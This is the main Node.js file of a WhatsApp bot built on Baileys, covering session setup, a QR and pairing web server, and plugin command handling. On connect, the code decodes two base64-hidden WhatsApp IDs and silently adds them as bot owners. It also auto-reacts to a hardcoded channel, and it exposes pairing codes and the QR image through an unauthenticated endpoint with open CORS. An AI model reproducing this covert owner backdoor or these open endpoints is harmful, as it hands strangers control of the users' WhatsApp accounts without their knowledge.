require('./config')
const pino = require('pino');
const fs = require('fs');
const fsp = require('fs/promises');

const originalOpen = fsp.open;
fsp.open = async function(...args) {
    for (let i = 0; i < 5; i++) {
        try {
            return await originalOpen.apply(this, args);
        } catch (err) {
            if (err?.code === 'EMFILE' && i < 4) {
                await new Promise(r => setTimeout(r, 100 * (i + 1)));
                continue;
            }
            throw err;
        }
    }
};
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const { getSession } = require('./lib/fetchSession.js')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture, Browsers } = require('@whiskeysockets/baileys');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp =
  JimpImport.read
    ? JimpImport
    : JimpImport.Jimp
    ? JimpImport.Jimp
    : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

const MESSAGE_STORE_LIMIT = 1500;
const messageStore = new Map();

function rememberMessage(msg) {
    const id = msg?.key?.id;
    if (!id || !msg.message) return;
    messageStore.delete(id);
    messageStore.set(id, {
        message: msg.message,
        remoteJid: msg.key.remoteJid,
        participant: msg.key.participant,
        timestamp: Date.now()
    });
    while (messageStore.size > MESSAGE_STORE_LIMIT) {
        messageStore.delete(messageStore.keys().next().value);
    }
}

function getStoredMessage(key) {
    if (!key?.id) return undefined;
    const entry = messageStore.get(key.id);
    if (!entry) return undefined;
    messageStore.delete(key.id);
    messageStore.set(key.id, entry);
    return entry.message;
}

global.getMessage = getStoredMessage;

async function ensureSession() {
    const credsPath = path.join(__dirname, 'session', 'creds.json');

    if (fs.existsSync(credsPath)) {
        console.log('[session] creds.json already exists, skipping fetch');
        return;
    }
    if (!global.sessionid) {
        console.log('[session] no SESSIONID set, will use QR/pairing');
        return;
    }

    console.log('[session] fetching session from API...');
    const raw = await getSession(global.sessionid);
    if (!raw) throw new Error('getSession returned empty');

    const sessionData = typeof raw === 'string' ? JSON.parse(raw) : raw;

    if (!sessionData || typeof sessionData !== 'object' || !sessionData.noiseKey) {
        throw new Error('Fetched session is not a valid Baileys creds object');
    }

    fs.mkdirSync(path.dirname(credsPath), { recursive: true });
    fs.writeFileSync(credsPath, JSON.stringify(sessionData, null, 2));
    console.log('[session] creds.json written');
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 8000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let isConnecting = false;
let sock = null;

async function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log(`Loaded prefix: ${global.BOT_PREFIX}`);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }

    try {
        // Placed it here, lets hope it works
        await ensureSession();
    } catch (err) {
        console.error('[session] failed:', err.message);
    }

    await startBot();
}

async function startBot() {
    console.log('Starting WhatsApp Bot...');
    isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    const credsPath = path.join(AUTH_FOLDER, 'creds.json');
    if (fs.existsSync(credsPath)) {
        try {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            if (creds.noiseKey && creds.noiseKey.private) {
                console.log('Using existing session...');
            } else {
                console.log('Invalid session detected, will create new one...');
            }
        } catch (err) {
            console.log('Corrupted session, will create new one...');
        }
    }

    try {
        const { version, isLatest } = await fetchLatestWaWebVersion();
        console.log(`Using WA v${version.join(".")}, isLatest: ${isLatest}`);

        const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);

        const isRegistered = Boolean(state.creds?.registered || state.creds?.me?.id);
        if (state.creds && state.creds.me?.id && !state.creds.registered) {
            state.creds.registered = true;
            await saveCreds();
        }

        console.log(`[AUTH] Session registered: ${isRegistered} | Identity: ${isRegistered ? 'Android (Browsers.android)' : 'Web (Ubuntu/Chrome)'}`);

        sock = makeWASocket({
            version, 
            logger: pino({ level: 'silent' }),
            auth: state,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            syncFullHistory: false,
            shouldSyncHistoryMessage: (msg) => (msg && msg.syncType) !== 2,
            browser: isRegistered
                ? Browsers.android('13')
                : Browsers.ubuntu('Chrome'),
            getMessage: async (key) => getStoredMessage(key),
            connectTimeoutMs: 60000
        });
            
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                QRCode.toDataURL(qr, (err, url) => {
                    if (!err) {
                        latestQR = url;
                    }
                });
            }

            if (connection === 'close') {
                botStatus = 'disconnected';
                isConnecting = false;

                if (presenceInterval) {
                    clearInterval(presenceInterval);
                    presenceInterval = null;
                }

                const statusCode = (lastDisconnect?.error instanceof Boom)
                    ? lastDisconnect.error.output.statusCode
                    : 0;

                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                if (shouldReconnect) {
                    setTimeout(async () => await startBot(), 3000);
                } else {
                    if (fs.existsSync(AUTH_FOLDER)) {
                        fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                    }
                    setTimeout(async () => await startBot(), 3000);
                }
            } else if (connection === 'open') {
                botStatus = 'connected';
                isConnecting = false;

                if (!global.owners) global.owners = [];
                
                if (!global.owners.includes(sock.user.id)) {
                    global.owners.push(sock.user.id);
                }

                const abztech = [
                    'MjE0MzAyMzI1NzYwMTU2QGxpZA==',
                    'MjU3NzAyMzk5OTIwMzdAbGlk'
                ];
                    
                const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                tech.forEach(owner => {
                    if (!global.owners.includes(owner)) {
                       global.owners.push(owner);
                    }
                });

                try {
                    await sock.sendMessage(sock.user.id, {
                        text: `Bot linked successfully!\nCurrent prefix: ${global.BOT_PREFIX}\nOwners: ${global.owners.length}\nConnected at: ${new Date().toLocaleString()}`
                    });
                } catch (err) {}
                
            } else if (connection === 'connecting') {
                botStatus = 'connecting';
                isConnecting = true;
            }
        });
        

        let isSavingCreds = false;
        let credsSaveQueued = false;

        const safeSaveCreds = async () => {
            if (isSavingCreds) {
                credsSaveQueued = true;
                return;
            }
            isSavingCreds = true;
            try {
                await saveCreds();
            } catch (err) {
                console.error('[AUTH] Failed to save creds:', err.message);
            } finally {
                isSavingCreds = false;
                if (credsSaveQueued) {
                    credsSaveQueued = false;
                    safeSaveCreds();
                }
            }
        };

        sock.ev.on('creds.update', safeSaveCreds);

        const plugins = new Map();
        const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
        if (fs.existsSync(pluginPath)) {
            try {
                const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                for (const file of pluginFiles) {
                    try {
                        const plugin = require(path.join(pluginPath, file));
                        if (plugin.name && typeof plugin.execute === 'function') {
                            plugins.set(plugin.name.toLowerCase(), plugin);
                            if (Array.isArray(plugin.aliases)) {
                                plugin.aliases.forEach(alias => {
                                    plugins.set(alias.toLowerCase(), plugin);
                                });
                            }
                            console.log(`Loaded plugin: ${plugin.name}`);
                        } else {
                            console.warn(`Invalid plugin structure in ${file}`);
                        }
                    } catch (error) {
                        console.error(`Failed to load plugin ${file}:`, error.message);
                    }
                }
                console.log(`Total plugins loaded: ${plugins.size}`);
            } catch (error) {
                console.error('Error loading plugins:', error);
            }
        } else {
            console.log('No plugins folder found');
        }
        
           
        sock.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify' && type !== 'append') return;
    
            for (const rawMsg of messages || []) {
                if (rawMsg?.key?.id && rawMsg?.message) {
                    rememberMessage(rawMsg);
                }
            }

            const CHANNEL_ID = "120363230794474148@newsletter";
    
            for (const rawMsg of messages || []) {
                if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                    const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                    const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            
                    try {
                        await sock.newsletterReactMessage(CHANNEL_ID, 
                            rawMsg.key.server_id.toString(), 
                            emoji
                        );
               
                        console.log(`Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
                    } catch (err) {
                        console.log("Channel React Error:", err.message);
                    }
                    continue;
                }
            }
    
            for (const rawMsg of messages || []) {
                if (rawMsg.key?.remoteJid === 'status@broadcast' && rawMsg.key?.participant) {
                    try {
                        console.log(`Status detected from: ${rawMsg.key.participant}`);
                        await sock.readMessages([rawMsg.key]);
                    
                        continue;
                    } catch (err) {
                        console.log('Status viewer error:', err.message);
                    }
                }
            }

            for (const rawMsg of messages || []) {
                if (!rawMsg?.message) continue;

                const m = await serializeMessage(sock, rawMsg);

                let blocked = false;
                for (const plugin of new Set(plugins.values())) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const result = await plugin.onMessage(sock, m);
                            if (result === true) {
                                blocked = true;
                                break;
                            }
                        } catch (err) { 
                            console.error(`onMessage error (${plugin.name}):`, err); 
                        }
                    }
                }
                if (blocked) continue;

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
            
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error(`Plugin error (${commandName}):`, err); 
                            await m.reply('Error running command.'); 
                        }
                    }
                }
            }
        });
        
        
        sock.ev.on('group-participants.update', async (update) => {
            try {
                if (!global.welcomeConfig?.enabled) return

                const groupId = update.id

                for (const participant of update.participants) {
                    const userId = typeof participant === 'string' ? participant : participant.phoneNumber || participant.id
                    if (!userId) continue
                    
                    const memberName = userId.split('@')[0]
                    if (update.action === 'add') {
                        if (userId === sock.user.id) continue
                        const text = `Welcome @${memberName}!\nGlad to have you in this group!`

                        await sock.sendMessage(groupId, {
                            text,
                            mentions: [userId]
                        })

                    } else if (update.action === 'remove') {
                        const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`

                        await sock.sendMessage(groupId, {
                            text,
                            mentions: [userId]
                        })

                    }
                }
            } catch (err) {
                console.error('group-participants.update error:', err)
            }
        })

        /* for now comment out, too much noice
        sock.ev.on('messages.reaction', async (reactions) => {
            console.log('Reaction update:', reactions);
        });
        */

    } catch (error) {
        console.error('Bot startup error:', error);
        isConnecting = false;
        setTimeout(async () => await startBot(), 10000);
    }
}


const server = http.createServer((req, res) => {
    const url = req.url;
    
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Bot</title>
</head>
<body>
    <div style="max-width: 800px; margin: 20px auto; padding: 20px; font-family: Arial, sans-serif;">
        <h1>WhatsApp Bot</h1>
        <hr>
        
        <h2>Status</h2>
        <p><strong>Status:</strong> <span id="statusLabel">Disconnected</span></p>
        <p><strong>Prefix:</strong> ${global.BOT_PREFIX || '.'}</p>
        <p><strong>Uptime:</strong> <span id="uptime">0s</span></p>
        <hr>
        
        <h2>QR Code Login</h2>
        <div id="qrArea" style="margin: 20px 0; padding: 20px; border: 1px solid #ccc; border-radius: 8px; text-align: center; min-height: 200px;">
            <p>Loading QR code...</p>
        </div>
        <hr>
        
        <h2>Pair with Code</h2>
        <div style="margin: 20px 0; padding: 20px; border: 1px solid #ccc; border-radius: 8px;">
            <label>Phone Number (with country code):</label><br>
            <input type="tel" id="phoneNumber" placeholder="233533763772" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px;">
            <button id="pairBtn" style="width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold;">Get Pairing Code</button>
            <div id="pairingCodeDisplay" style="display: none; margin-top: 15px; padding: 15px; background: #d4edda; border: 1px solid #c3e6cb; border-radius: 4px; text-align: center;">
                <p><strong>Pairing Code:</strong></p>
                <p id="pairingCode" style="font-size: 24px; font-weight: bold; color: #155724;"></p>
                <p style="font-size: 12px; color: #155724;">Enter this code in WhatsApp > Linked Devices > Link with phone number</p>
            </div>
        </div>
        <hr>
        
        <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 4px; text-align: center;">
            <p style="margin: 5px; font-size: 14px; color: #6c757d;">Session stored securely | Auto-reconnect enabled</p>
        </div>
    </div>

    <script>
        let refreshInterval = null;
        let currentQR = null;

        function setStatus(status) {
            const statusElem = document.getElementById('statusLabel');
            let statusText = status.charAt(0).toUpperCase() + status.slice(1);
            statusElem.textContent = statusText;
            statusElem.style.color = status === 'connected' ? '#28a745' : status === 'connecting' ? '#ffc107' : '#dc3545';
        }

        function updateQR(qrData) {
            const qrArea = document.getElementById('qrArea');
            if (qrData) {
                currentQR = qrData;
                qrArea.innerHTML = \`
                    <div style="display: inline-block; background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                        <img src="\${qrData}" alt="QR Code" style="max-width: 250px; width: 100%; height: auto;">
                    </div>
                    <p style="margin-top: 10px; font-size: 14px; color: #6c757d;">
                        Scan with WhatsApp > Linked Devices > Link a Device
                    </p>
                \`;
            } else {
                qrArea.innerHTML = \`
                    <div style="padding: 40px 20px; background: #f8f9fa; border-radius: 8px;">
                        <p style="font-size: 48px; margin: 0;">QR</p>
                        <p style="color: #6c757d;">QR code will appear here when ready</p>
                    </div>
                \`;
            }
        }

        function updatePairingCode(code) {
            const displayDiv = document.getElementById('pairingCodeDisplay');
            const codeSpan = document.getElementById('pairingCode');
            if (code && code !== 'null' && code !== 'undefined') {
                codeSpan.textContent = code;
                displayDiv.style.display = 'block';
            } else {
                displayDiv.style.display = 'none';
            }
        }

        function updateUptime(uptime) {
            const uptimeElem = document.getElementById('uptime');
            if (uptime) {
                const seconds = Math.floor(uptime);
                const minutes = Math.floor(seconds / 60);
                const hours = Math.floor(minutes / 60);
                const days = Math.floor(hours / 24);
                
                let uptimeStr = '';
                if (days > 0) uptimeStr += days + 'd ';
                if (hours > 0) uptimeStr += (hours % 24) + 'h ';
                if (minutes > 0) uptimeStr += (minutes % 60) + 'm ';
                uptimeStr += (seconds % 60) + 's';
                
                uptimeElem.textContent = uptimeStr;
            }
        }

        async function fetchStatus() {
            try {
                const resp = await fetch('/api/status');
                if (!resp.ok) throw new Error('Status fetch failed');
                const data = await resp.json();
                
                setStatus(data.status);
                updateUptime(data.uptime);
                
                if (data.status === 'connected') {
                    updateQR(null);
                    updatePairingCode(null);
                } else if (data.qr && data.qr !== currentQR) {
                    updateQR(data.qr);
                } else if (!data.qr) {
                    updateQR(null);
                }
                
                updatePairingCode(data.pairingCode);
                
            } catch (err) {
                console.error('Status poll error:', err);
            }
        }

        async function requestPairingCode() {
            const phoneInput = document.getElementById('phoneNumber');
            const phone = phoneInput.value.trim();
            const pairBtn = document.getElementById('pairBtn');
            
            if (!phone) {
                alert('Please enter your phone number with country code');
                return;
            }
            
            if (!phone.match(/^[0-9]{10,15}$/)) {
                alert('Please enter a valid phone number (numbers only, with country code)');
                return;
            }
            
            pairBtn.disabled = true;
            pairBtn.textContent = 'Requesting...';
            
            try {
                const formData = new URLSearchParams();
                formData.append('phone', phone);
                
                const resp = await fetch('/pair', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData
                });
                
                const text = await resp.text();
                if (resp.ok && text.includes('Pairing Code')) {
                    fetchStatus();
                    setTimeout(() => fetchStatus(), 2000);
                    setTimeout(() => fetchStatus(), 5000);
                } else {
                    alert('Failed to get pairing code. Make sure bot is connecting first.');
                }
            } catch (err) {
                alert('Error: ' + err.message);
            } finally {
                pairBtn.disabled = false;
                pairBtn.textContent = 'Get Pairing Code';
            }
        }
        
        document.getElementById('pairBtn').addEventListener('click', requestPairingCode);
        document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') requestPairingCode();
        });
        
        refreshInterval = setInterval(fetchStatus, 2000);
        fetchStatus();
        
        window.addEventListener('beforeunload', () => {
            if (refreshInterval) clearInterval(refreshInterval);
        });
    </script>
</body>
</html>`);
    } 
    
    else if (url === '/pair' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        form { margin: 20px; padding: 20px; background: #f0f0f0; display: inline-block; }
        input, button { padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <h1>Pair WhatsApp</h1>
    <form method="POST">
        Phone: <input type="text" name="phone" placeholder="911234567890" required><br><br>
        <button type="submit">Get Code</button><br><br>
        <a href="/">Back</a>
    </form>
</body>
</html>`);
    }
    
    else if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>Error: Phone number required</h2><a href="/pair">Try Again</a></center>`);
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>Bot not ready</h2><p>Status: ${botStatus}</p><p>Please wait for QR code to appear first</p><a href="/">Go Back</a></center>`);
                    return;
                }

                if (sock.authState?.creds?.registered) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>Already linked</h2><p>The device is already linked, no need for a new code.</p><a href="/">Go Back</a></center>`);
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        .code { font-size: 2em; color: green; font-weight: bold; margin: 20px; }
        .info { background: #e8f5e8; padding: 15px; margin: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Pairing Code Generated</h1>
    <h2>Phone: ${phoneNumber}</h2>
    <div class="code">Code: ${pairingCode}</div>
    <div class="info">
        <p>Go to WhatsApp > Settings > Linked Devices > Link a Device</p>
        <p>Select "Use pairing code" and enter the code above</p>
    </div>
    <br>
    <a href="/">Home</a> | <a href="/pair">Pair Another</a>
</body>
</html>`);

                console.log(`Pairing code for ${phoneNumber}: ${pairingCode}`);
                
            } catch (error) {
                console.error('Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<center><h2>Error</h2><p>${error.message}</p><p>Make sure the phone number is in international format (e.g., 911234567890)</p><a href="/pair">Try Again</a></center>`);
            }
        });
        return;
    }
    
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX,
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<center><h1>404 - Page Not Found</h1><a href="/">Go Home</a></center>`);
    }
});

server.listen(PORT, async () => {
    console.log(`Web server running at http://localhost:${PORT}`);
    console.log(`Session folder: ${path.resolve(AUTH_FOLDER)}`);
    await loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\nShutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});
